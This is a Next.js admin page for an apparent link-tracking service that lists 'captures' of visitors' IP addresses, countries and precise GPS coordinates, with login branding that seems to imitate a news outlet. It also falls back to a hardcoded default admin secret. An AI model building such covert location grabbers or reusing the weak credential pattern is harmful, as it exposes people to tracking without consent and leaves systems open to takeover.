import { cookies } from 'next/headers';
import { sql } from '@/lib/db';
import AdminShell from './AdminShell';
import { signIn } from './actions';

export const dynamic = 'force-dynamic';

export default async function AdminPage({
  searchParams,
}: {
  searchParams: { code?: string };
}) {
  const jar    = cookies();
  const secret = process.env.ADMIN_SECRET ?? 'AdminTrack123!';
  const authed = jar.get('admin_auth')?.value === secret;

  if (!authed) return <LoginPage />;

  try {
    const filterCode = searchParams.code ?? null;

    const allLinks = await sql`SELECT * FROM links ORDER BY created_at DESC`;

    const captures = filterCode
      ? await sql`SELECT * FROM captures WHERE code = ${filterCode} ORDER BY id DESC LIMIT 500`
      : await sql`SELECT * FROM captures ORDER BY id DESC LIMIT 500`;

    const statsRows = filterCode
      ? await sql`
          SELECT
            COUNT(*)                                             AS total,
            COUNT(DISTINCT ip)                                   AS unique_ips,
            COUNT(DISTINCT geo_country)
              FILTER (WHERE geo_country IS NOT NULL)             AS countries,
            COUNT(*) FILTER (WHERE precise_lat IS NOT NULL)      AS with_gps
          FROM captures WHERE code = ${filterCode}
        `
      : await sql`
          SELECT
            COUNT(*)                                             AS total,
            COUNT(DISTINCT ip)                                   AS unique_ips,
            COUNT(DISTINCT geo_country)
              FILTER (WHERE geo_country IS NOT NULL)             AS countries,
            COUNT(*) FILTER (WHERE precise_lat IS NOT NULL)      AS with_gps
          FROM captures
        `;

    return (
      <AdminShell
        allLinks={allLinks  as never}
        captures={captures  as never}
        stats={statsRows[0] as never}
        filterCode={filterCode}
      />
    );
  } catch (err: unknown) {
    const msg        = err instanceof Error ? err.message : String(err);
    const needsSetup = msg.includes('does not exist') || msg.includes('relation') || msg.includes('connection');
    return <SetupPrompt needsSetup={needsSetup} error={msg} />;
  }
}

function LoginPage() {
  return (
    <div style={{
      background: '#0d0d0d', display: 'flex', alignItems: 'center',
      justifyContent: 'center', minHeight: '100vh',
      fontFamily: "'Segoe UI', system-ui, sans-serif",
    }}>
      <div style={{
        background: '#111', border: '1px solid #222', borderRadius: 6,
        padding: '32px 28px', width: 320,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <div style={{ display: 'flex', gap: 2 }}>
            {['B','B','C'].map((l, i) => (
              <span key={i} style={{
                display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
                background: '#fff', color: '#000', width: 20, height: 20,
                fontSize: 11, fontWeight: 900,
              }}>{l}</span>
            ))}
          </div>
          <span style={{ color: '#fff', fontSize: 15, fontWeight: 600 }}>Tracker Admin</span>
        </div>
        <form action={signIn}>
          <label style={{
            color: '#555', fontSize: 11, textTransform: 'uppercase' as const,
            letterSpacing: '.05em', display: 'block', marginBottom: 6,
          }}>
            Admin Secret
          </label>
          <input
            name="key"
            type="password"
            placeholder="Enter admin password"
            autoFocus
            style={{
              width: '100%', background: '#1a1a1a', border: '1px solid #2a2a2a',
              borderRadius: 4, padding: '8px 10px', color: '#e0e0e0',
              fontSize: 14, outline: 'none', marginBottom: 14, display: 'block',
            }}
          />
          <button type="submit" style={{
            width: '100%', background: '#1f3a28', border: '1px solid #2e5c3a',
            color: '#6dcc82', padding: 10, borderRadius: 4,
            fontSize: 14, fontWeight: 600, cursor: 'pointer',
          }}>
            Sign in
          </button>
        </form>
      </div>
    </div>
  );
}

function SetupPrompt({ needsSetup, error }: { needsSetup: boolean; error: string }) {
  return (
    <div style={{
      background: '#0d0d0d', display: 'flex', alignItems: 'center',
      justifyContent: 'center', minHeight: '100vh',
      fontFamily: "'Segoe UI', system-ui, sans-serif", color: '#d8d8d8',
    }}>
      <div style={{
        background: '#111', border: '1px solid #2a2a2a', borderRadius: 6,
        padding: 32, maxWidth: 480, width: '100%',
      }}>
        <h2 style={{ color: '#fff', fontSize: 16, marginBottom: 12 }}>
          {needsSetup ? 'Database tables not found' : 'Database error'}
        </h2>
        {needsSetup ? (
          <>
            <p style={{ color: '#888', fontSize: 13, marginBottom: 20, lineHeight: 1.6 }}>
              The database is connected but tables haven&apos;t been created yet.
              Click below to initialise them:
            </p>
            <a href="/api/setup" style={{
              display: 'block', background: '#1f3a28', border: '1px solid #2e5c3a',
              color: '#6dcc82', padding: '10px 16px', borderRadius: 4,
              fontSize: 14, fontWeight: 600, textDecoration: 'none', textAlign: 'center',
            }}>
              Run /api/setup →
            </a>
            <p style={{ color: '#555', fontSize: 12, marginTop: 12 }}>
              After it shows &#123;&quot;ok&quot;:true&#125; come back and refresh.
            </p>
          </>
        ) : (
          <>
            <p style={{ color: '#888', fontSize: 13, marginBottom: 12 }}>
              Check that your Postgres database is connected in the Vercel Storage tab
              and the environment variables have been deployed.
            </p>
            <pre style={{
              background: '#0a0a0a', padding: 12, borderRadius: 4,
              fontSize: 11, color: '#666', overflow: 'auto',
            }}>{error}</pre>
          </>
        )}
      </div>
    </div>
  );
}
